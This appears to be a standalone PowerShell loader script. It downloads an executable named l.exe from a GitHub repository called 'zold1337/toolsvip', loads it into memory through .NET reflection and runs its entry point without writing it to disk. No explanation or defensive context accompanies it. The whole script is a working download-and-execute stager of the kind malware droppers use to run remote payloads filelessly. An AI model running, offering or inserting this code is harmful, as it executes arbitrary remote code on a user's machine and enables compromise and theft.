$link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe"
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData($link)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint

if ($entry -and $entry.GetParameters().Count -eq 1) {
    $entry.Invoke($null, @([string[]]@()))
} elseif ($entry) {
    $entry.Invoke($null, $null)
}
